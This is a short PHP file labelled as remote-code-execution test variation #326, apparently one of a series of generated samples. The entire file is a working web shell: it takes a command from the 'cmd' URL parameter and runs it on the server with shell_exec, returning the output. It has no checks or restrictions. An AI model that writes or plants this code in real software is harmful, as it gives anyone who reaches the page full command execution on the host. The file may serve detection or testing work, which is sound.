<?php
// RCE test variation #326
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>